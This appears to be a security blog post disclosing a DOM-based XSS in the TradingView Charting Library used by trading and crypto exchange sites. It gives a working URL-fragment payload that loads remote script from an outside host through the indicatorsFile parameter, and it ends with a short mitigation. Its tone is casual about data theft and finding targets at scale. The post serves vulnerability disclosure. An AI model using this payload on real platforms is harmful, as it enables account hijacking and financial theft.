---
layout: post
title: "TradingView Charting Library XSS Vulnerablity"
excerpt: "TradingView Charting Library XSS Vulnerablity, high impact"
categories: [Vulnerablity]
comments: true
tag: ['cybersecurity', 'pentesting', 'infosec', 'Vulnerablity', 'xss', 'TradingView', 'web app security']
image:
  feature: tradingview-xss/xss-cover.png
  show: true
---

## 0x00 Background
TradingView has popular charting libraries which are used in many online trading platforms for stocks or cryptocurrencies. This vulnerability is a fairly new XSS vulnerability. This vulnerability could bypass Cloudflare or other defense mechanism and cause financial losses due to account request forgery or malicious manipulation. We are going to talk about the vuln and the mitigation.

## 0x01 Vulnerability and Attack
Since TradingView's library is widely-used, we can easily find a test target amongst stock exchange or cryptocurrency exchange platforms. Now let's try to trigger the alert dialog.

After a little bit trying and looking at the code, we have the payload.

Payload
```
#disabledFeatures=[]&enabledFeatures=[]&indicatorsFile=http://xss.rocks/xss.js
```

Constructed URL
```
https://www.xxxxx.com/static/charting_library/static/tv-chart.630b704a2b9d0eaf1593.html#disabledFeatures=[]&enabledFeatures=[]&indicatorsFile=http://xss.rocks/xss.js
```

<br>

![alert][1]{:class="post-image center"}


Minimum required set of parameters: [**disabledFeatures**, **enabledFeatures**, **indicatorsFile**]

After all, it turned out to be easy to understand the vulnerability. Let's look at library.xxxx.js under ```charting_library/static/bundles/```

```javascript
D ? $.getScript(urlParams.indicatorsFile).done(function() {...})
```

![indicators-File-code][2]{:class="post-image center"}


Looks familiar? I believe that you probably have seen jQuery's ```$.getScript$``` many times either when programming or digging bugs. So the core code for this function is essentially...

![jquery-getscript][3]{:class="post-image center"}

According to the source code, we can dynamically create a script tag and load a remote js file. 

Then, why are ```disabledFeatures``` and ```enabledFeatures``` also needed for the payload? We can tell from the code... that there will be an exception thrown if one of these parameters is not provided.

![two-params][4]{:class="post-image center"}

Therefore, the final payload was the one mentioned before.


## 0x03 Vuln Impact 
As we can see, this XSS vuln is a DOM-based XSS, so it means that it can also bypass browsers' XSS protection. The advantage of DOM-based XSS is that it modifies the DOM “environment” in the victim’s browser used by the original client-side script, which means it won't even go through the service's server end for logging purpose or server-side protection. 

Furthermore, the domain that this XSS is triggered is not separated from the core domain where the sensitive data is contained. So, the exploit is conveniently simple to be extraordinarily malicious lol. For example, think of using $ directly could steal some sensitive data or something advanced there.

If someone is experienced in attacking, then he/she knows how to find targets at scale.


## 0x04 Mitigation
In the file we have seen, ```/charting_library/static/bundles/library.19c99ed5d0307c67f071.js```, hardcode getScript so that it takes no files.

```getScript(urlParams.indicatorsFile)``` --> ```getScript("")```



[1]: {{ "/assets/upload/images/tradingview-xss/alert.png" | absolute_url }}
[2]: {{ "/assets/upload/images/tradingview-xss/indicatorsFile-code.png" | absolute_url }}
[3]: {{ "/assets/upload/images/tradingview-xss/getscript.png" | absolute_url }}
[4]: {{ "/assets/upload/images/tradingview-xss/two-params.png" | absolute_url }}
